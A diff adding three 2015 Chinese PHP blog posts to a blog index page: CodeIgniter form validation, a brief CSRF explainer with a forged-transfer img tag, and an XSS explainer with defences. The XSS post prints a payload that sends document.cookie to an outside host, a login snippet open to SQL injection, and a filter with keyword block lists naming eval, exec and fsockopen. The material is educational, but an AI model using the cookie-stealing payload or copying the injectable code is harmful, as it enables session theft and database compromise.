@@ -82,6 +82,727 @@
       
   <header class="page-header">
     
+      <h1 class="entry-title"><a href="/blog/2015/06/29/ci001/">Codeigniter之表单验证</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-29T10:01:02+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:01 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><figcaption><span>html </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;form action="" method="POST" enctype="multipart/form-data">
+</span><span class='line'>  &lt;table class="table">
+</span><span class='line'>      &lt;tr >
+</span><span class='line'>          &lt;td class="th" colspan="10">编辑文章&lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>标题&lt;/td>
+</span><span class='line'>          &lt;td>&lt;input type="text" name="title" value="&lt;?php echo set_value('title') ?>"/>
+</span><span class='line'>          &lt;?php echo form_error('title', '&lt;span>', '&lt;/span>') ?>
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>类型&lt;/td>
+</span><span class='line'>          &lt;td>
+</span><span class='line'>              &lt;input type="radio" name="type" value="0"&lt;?php echo set_radio('type', '0', TRUE) ?>/> 普通
+</span><span class='line'>              &lt;input type="radio" name="type" value="1"&lt;?php echo set_radio('type', '1') ?>/> 热门
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>栏目&lt;/td>
+</span><span class='line'>          &lt;td>
+</span><span class='line'>              &lt;select name="cid" id="">
+</span><span class='line'>                  &lt;option value="1"&lt;?php echo set_select('cid', '1', TRUE) ?>>情感&lt;/option>
+</span><span class='line'>                  &lt;option value="2"&lt;?php echo set_select('cid', '2') ?>>生活&lt;/option>
+</span><span class='line'>              &lt;/select>
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>缩略图&lt;/td>
+</span><span class='line'>          &lt;td>
+</span><span class='line'>              &lt;input type="file" />
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>摘要&lt;/td>
+</span><span class='line'>          &lt;td>
+</span><span class='line'>              &lt;textarea name="info" id="" style="width:550px;height:160px;">&lt;?php echo set_value('info') ?>&lt;/textarea>&lt;?php echo form_error('info', '&lt;span>', '&lt;/span>') ?>
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td>内容&lt;/td>
+</span><span class='line'>          &lt;td>
+</span><span class='line'>              &lt;textarea name="content" id="" style="width:550px;height:500px;">&lt;?php echo set_value('content') ?>&lt;/textarea>
+</span><span class='line'>              &lt;?php echo form_error('content', '&lt;span>', '&lt;/span>') ?>
+</span><span class='line'>          &lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>      &lt;tr>
+</span><span class='line'>          &lt;td colspan="10">&lt;input type="submit" class="input_button" value="发布"/>&lt;/td>
+</span><span class='line'>      &lt;/tr>
+</span><span class='line'>  &lt;/table>
+</span><span class='line'>  &lt;/form></span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>public function send(){
+</span><span class='line'>      //载入表单验证类
+</span><span class='line'>      $this->load->library('form_validation');
+</span><span class='line'>      //引入验证规则
+</span><span class='line'>      $status = $this->form_validation->run('article');
+</span><span class='line'>
+</span><span class='line'>      if($status){
+</span><span class='line'>          //文件上传------------------------
+</span><span class='line'>          //配置
+</span><span class='line'>          $config['upload_path'] = './uploads/';
+</span><span class='line'>          $config['allowed_types'] = 'gif|jpg|png|jpeg';
+</span><span class='line'>          $config['max_size'] = '10000';
+</span><span class='line'>          $config['file_name'] = time() . mt_rand(1000,9999);
+</span><span class='line'>
+</span><span class='line'>          //载入上传类
+</span><span class='line'>          $this->load->library('upload', $config);
+</span><span class='line'>          //执行上传
+</span><span class='line'>          $status = $this->upload->do_upload('thumb');
+</span><span class='line'>      
+</span><span class='line'>          $wrong = $this->upload->display_errors();
+</span><span class='line'>
+</span><span class='line'>          if($wrong){
+</span><span class='line'>              error($wrong);
+</span><span class='line'>          }
+</span><span class='line'>          //返回信息
+</span><span class='line'>          $info = $this->upload->data();
+</span><span class='line'>
+</span><span class='line'>          //缩略图-----------------
+</span><span class='line'>          //配置
+</span><span class='line'>          $arr['source_image'] = $info['full_path'];
+</span><span class='line'>          $arr['create_thumb'] = FALSE;
+</span><span class='line'>          $arr['maintain_ratio'] = TRUE;
+</span><span class='line'>          $arr['width'] = 200;
+</span><span class='line'>          $arr['height'] = 200;   
+</span><span class='line'>
+</span><span class='line'>          //载入缩略图类
+</span><span class='line'>          $this->load->library('image_lib', $arr);
+</span><span class='line'>          //执行动作
+</span><span class='line'>          $status = $this->image_lib->resize();
+</span><span class='line'>
+</span><span class='line'>          if(!$status){
+</span><span class='line'>              error('缩略图动作失败');
+</span><span class='line'>          }
+</span><span class='line'>
+</span><span class='line'>          $this->load->model('article_model', 'art');
+</span><span class='line'>
+</span><span class='line'>          $data = array(
+</span><span class='line'>              'title' => $this->input->post('title'),
+</span><span class='line'>              'type'  => $this->input->post('type'),
+</span><span class='line'>              'cid'   => $this->input->post('cid'),
+</span><span class='line'>              'thumb' => $info['file_name'],
+</span><span class='line'>              'info'  => $this->input->post('info'),
+</span><span class='line'>              'content'=> $this->input->post('content'),
+</span><span class='line'>              'time'  => time()
+</span><span class='line'>              );  
+</span><span class='line'>
+</span><span class='line'>          $this->art->add($data);
+</span><span class='line'>          success('admin/article/index', '发表成功');
+</span><span class='line'>      }else {
+</span><span class='line'>          $this->load->model('category_model', 'cate');
+</span><span class='line'>          $data['category'] = $this->cate->check();
+</span><span class='line'>          $this->load->helper('form');
+</span><span class='line'>          $this->load->view('admin/article.html',$data);
+</span><span class='line'>      }
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>注意:</strong>保存验证规则需要在application/config/文件夹下创建一个名称为form_validation.php的文件。然后将配置信息保存在数组$config中即可.</p>
+
+<figure class='code'><figcaption><span>form_validation </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$config = array(
+</span><span class='line'>  'article'   =>  array(
+</span><span class='line'>          array(
+</span><span class='line'>              'field' =>  'title',
+</span><span class='line'>              'label' => '标题',
+</span><span class='line'>              'rules' => 'required|min_length[5]'
+</span><span class='line'>              ),
+</span><span class='line'>          array(
+</span><span class='line'>              'field' =>  'type',
+</span><span class='line'>              'label' => '类型',
+</span><span class='line'>              'rules' => 'required|integer'
+</span><span class='line'>              ),
+</span><span class='line'>          array(
+</span><span class='line'>              'field' =>  'cid',
+</span><span class='line'>              'label' => '栏目',
+</span><span class='line'>              'rules' => 'integer'
+</span><span class='line'>              ),
+</span><span class='line'>          array(
+</span><span class='line'>              'field' =>  'info',
+</span><span class='line'>              'label' => '摘要',
+</span><span class='line'>              'rules' => 'required|max_length[155]'
+</span><span class='line'>              ),
+</span><span class='line'>          array(
+</span><span class='line'>              'field' =>  'content',
+</span><span class='line'>              'label' => '内容',
+</span><span class='line'>              'rules' => 'required|max_length[2000]'
+</span><span class='line'>              )
+</span><span class='line'>
+</span><span class='line'>      ),
+</span><span class='line'>  'cate'  => array(
+</span><span class='line'>          array(
+</span><span class='line'>              'field' => 'cname',
+</span><span class='line'>              'label' => '栏目名称',
+</span><span class='line'>              'rules' => 'required|max_length[20]'
+</span><span class='line'>              ),
+</span><span class='line'>
+</span><span class='line'>      ),
+</span><span class='line'>
+</span><span class='line'>  );</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header class="page-header">
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/25/php004/">Csrf攻击</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T13:25:55+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:25 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>什么是csrf攻击</h2>
+
+<p>csrf（cross-site request forgery）跨站请求伪造</p>
+
+<h2>csrf的原理</h2>
+
+<p><img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="tool-manager" /></p>
+
+<h2>例如：</h2>
+
+<p>银行网站A，它以get请求来完成银行转账的操作，<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100</a>
+危险网站B，它里面有一段html的代码如下：
+<code>&lt;img src='http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100'/&gt;</code></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header class="page-header">
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/25/php003/">Xss攻击</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T13:25:55+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:25 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>什么是xss</h2>
+
+<p>xss 表示cross site scripting（跨站脚本攻击）
+一般分为两中类型
+1：非持久型攻击
+2：持久型攻击</p>
+
+<h3>例如:</h3>
+
+<figure class='code'><figcaption><span>非持久型 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>非持久型攻击是一次性的，仅对当前的页面访问产生影响
+</span><span class='line'>$name = $_GET['name'];
+</span><span class='line'>echo "welcome $name";
+</span><span class='line'>echo "&lt;a href='http://www.baidu.com'>click to down&lt;/a>";
+</span><span class='line'>攻击者可以通过下面url链接
+</span><span class='line'>index.php?name=guest&lt;script>alert('test')&lt;/script>
+</span><span class='line'>index.php?name=guest&lt;script>new Image().src="http://mytest.com/?"+document.cookie&lt;/script></span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>持久型 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
+</span><span class='line'>$host = '192.168.1.8';
+</span><span class='line'>$dbname = 'app';
+</span><span class='line'>$user = 'yyy';
+</span><span class='line'>$password = 'xxx';
+</span><span class='line'>$schema = 'test';
+</span><span class='line'>$conection_string = "host=$host dbname=$dbname user=$user password=$password";
+</span><span class='line'>$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
+</span><span class='line'>if(!Connect){
+</span><span class='line'>  echo 'database connection failure';
+</span><span class='line'>  exit;
+</span><span class='line'>}
+</span><span class='line'>$query = "select user_name,password from $schema.members where user_name'".$_POST['user_name']."'";
+</span><span class='line'>$result = pg_query($connect,$query);
+</span><span class='line'>$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
+</span><span class='line'>$user_pass = md5($_POST['pass_word']);
+</span><span class='line'>$user_name = $row['user_name'];
+</span><span class='line'>if(strcmp($user_pass,$row['password']!=0)){
+</span><span class='line'>  echo "Login failed";
+</span><span class='line'>}else{
+</span><span class='line'>  session_start();
+</span><span class='line'>  $_SESSION['USER_NAME'] = $user_name;
+</span><span class='line'>  echo "&lt;head>&lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\">&lt;/head>";
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>预防措施</h2>
+
+<figure class='code'><figcaption><span>cookie </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
+</span><span class='line'>setcookie(name,value,expire,path,domain,secure)
+</span><span class='line'>name:cookie的名称 
+</span><span class='line'>value：cookie的值
+</span><span class='line'>expire：cookie的有效期
+</span><span class='line'>path：cookie的服务器路径
+</span><span class='line'>domain：cookie的域名
+</span><span class='line'>secure：规定是否通过安全的https链接来传输cookie</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>输入检查 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>不要让用户写入任何script和发起恶意http请求的东西
+</span><span class='line'>htmlspecialchars处理</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>防止xss攻击（不是我写的）</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function xss_clean($str, $is_image = FALSE)
+</span><span class='line'>{
+</span><span class='line'>  if (is_array($str))
+</span><span class='line'>  {
+</span><span class='line'>      while (list($key) = each($str))
+</span><span class='line'>      {
+</span><span class='line'>          $str[$key] = $this->xss_clean($str[$key]);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      return $str;
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $str = remove_invisible_characters($str);
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_validate_entities($str);
+</span><span class='line'>
+</span><span class='line'>  $str = rawurldecode($str);
+</span><span class='line'>
+</span><span class='line'>  $str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
+</span><span class='line'>
+</span><span class='line'>  $str = preg_replace_callback("/&lt;\w+.*?(?=>|&lt;|$)/si", array($this, '_decode_entity'), $str);
+</span><span class='line'>
+</span><span class='line'>  $str = remove_invisible_characters($str);
+</span><span class='line'>  if (strpos($str, "\t") !== FALSE)
+</span><span class='line'>  {
+</span><span class='line'>      $str = str_replace("\t", ' ', $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $converted_string = $str;
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_do_never_allowed($str);
+</span><span class='line'>
+</span><span class='line'>  if ($is_image === TRUE)
+</span><span class='line'>  {
+</span><span class='line'>      $str = preg_replace('/&lt;\?(php)/i', "&lt;?\\1", $str);
+</span><span class='line'>  }
+</span><span class='line'>  else
+</span><span class='line'>  {
+</span><span class='line'>      $str = str_replace(array('&lt;?', '?'.'>'),  array('&lt;?', '?&gt;'), $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $words = array(
+</span><span class='line'>      'javascript', 'expression', 'vbscript', 'script', 'base64',
+</span><span class='line'>      'applet', 'alert', 'document', 'write', 'cookie', 'window'
+</span><span class='line'>  );
+</span><span class='line'>
+</span><span class='line'>  foreach ($words as $word)
+</span><span class='line'>  {
+</span><span class='line'>      $temp = '';
+</span><span class='line'>
+</span><span class='line'>      for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
+</span><span class='line'>      {
+</span><span class='line'>          $temp .= substr($word, $i, 1)."\s*";
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  do
+</span><span class='line'>  {
+</span><span class='line'>      $original = $str;
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/&lt;a/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace_callback("#&lt;a\s+([^>]*?)(>|$)#si", array($this, '_js_link_removal'), $str);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/&lt;img/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace_callback("#&lt;img\s+([^>]*?)(\s?/?>|$)#si", array($this, '_js_img_removal'), $str);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\>#si", '[removed]', $str);
+</span><span class='line'>      }
+</span><span class='line'>  }
+</span><span class='line'>  while($original != $str);
+</span><span class='line'>
+</span><span class='line'>  unset($original);
+</span><span class='line'>  $str = $this->_remove_evil_attributes($str, $is_image);
+</span><span class='line'>  $naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
+</span><span class='line'>  $str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^>&lt;]*)([>&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
+</span><span class='line'>  $str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&#40;\\3&#41;", $str);
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_do_never_allowed($str);
+</span><span class='line'>
+</span><span class='line'>  if ($is_image === TRUE)
+</span><span class='line'>  {
+</span><span class='line'>      return ($str == $converted_string) ? TRUE: FALSE;
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  log_message('debug', "XSS Filtering completed");
+</span><span class='line'>  return $str;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header class="page-header">
+    
       <h1 class="entry-title"><a href="/blog/2015/06/19/other001/">H5的兼容问题</a></h1>
     
     
@@ -651,6 +1372,18 @@
     <section class="well">
   <ul id="recent_posts" class="nav nav-list">
     <li class="nav-header">Recent Posts</li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/14/php006/">PHP无限极分类</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/14/php005/">PHP判断远程文件是否存在的几种方法</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/14/other002/">sublime配置全攻略</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/07/10/apache002/">apache基本配置</a>
